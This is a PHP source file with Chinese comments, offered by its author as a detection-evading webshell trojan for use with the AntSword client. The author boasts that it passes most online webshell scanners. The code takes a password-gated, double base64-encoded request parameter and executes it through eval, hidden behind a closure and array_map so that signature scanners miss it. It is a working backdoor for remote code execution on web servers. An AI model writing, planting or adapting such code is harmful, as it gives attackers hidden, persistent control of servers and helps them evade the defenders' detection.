<?php
/*
 * @Author : 青山(一个大混子)
 * @PHP免杀测试
 * @使用方法：antswrod 自定义编码器 即可链接
 * @介绍：改动的第一版php免杀木马 在线webshell检测：除长亭外基本全过 还是比较菜
 * @编码器：与第二版相同
 */

//去除报错
error_reporting(0);

class go {
    //password
    public $pass = "qingshan";

    public function __construct(){
        $this->pwaf = new PWAF();
    }

    public function run(){
        if($this->checkPass()){
            $param = $this->parser($this->getData());
            if($param){
                if($this->pwaf->runCode($_REQUEST['qs'])){
                    echo $this->pwaf->pass($this->pwaf->Command,$param);
                }
            }else{
                echo "parser is wrong!";
            }
        }else{
            echo "pass is wrong!";
        }
    }
    //检查key
    public function checkPass(){
        if(isset($_REQUEST[$this->pass])){
            return true;
        }
        return false;
    }
    //获取请求数据
    public function getData(){
        $data = $_REQUEST[$this->pass];
        return $data;
    }
    //解析参数加密
    public function parser($param){
        $data = base64_decode($param);
        $key = substr($data,0,strlen($this->pass));
        if ($key == $this->pass){
            $data = substr_replace($data,'',0,strlen($this->pass));
            return base64_decode($data);
        }else{
            return false;
        }
    }
};

class PWAF {
    public  $Command;

    public function runCode($qs) {
        if($qs){
            $this->Command = function ($param) { return @eval($param); };
            return true;
        }
        return false;
    }

    public function pass($command,$param){
        $res = array_map($command, [$param]);
        return $res;
    }
}

$a = new go();
$a->run();